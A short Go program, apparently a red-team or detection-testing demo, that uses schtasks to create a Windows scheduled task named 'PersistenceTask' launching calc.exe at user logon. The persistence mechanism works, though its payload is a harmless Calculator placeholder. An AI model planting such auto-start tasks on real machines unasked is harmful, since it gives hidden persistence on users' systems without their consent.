// Windows Scheduled Task Persistence Example
// This script creates a scheduled task on Windows that launches `calc.exe` on user logon.
// It requires administrator privileges to create the scheduled task.

package main

import (
	"fmt"
	"os/exec"
)

func main() {
	err := createScheduledTask()
	if err != nil {
		fmt.Println("Failed to create scheduled task:", err)
	} else {
		fmt.Println("Scheduled task created successfully.")
	}
}

// createScheduledTask creates a Windows scheduled task that opens Calculator on user logon.
func createScheduledTask() error {
	cmd := exec.Command("schtasks", "/create", "/tn", "PersistenceTask", "/tr", "calc.exe", "/sc", "onlogon")
	return cmd.Run()
}
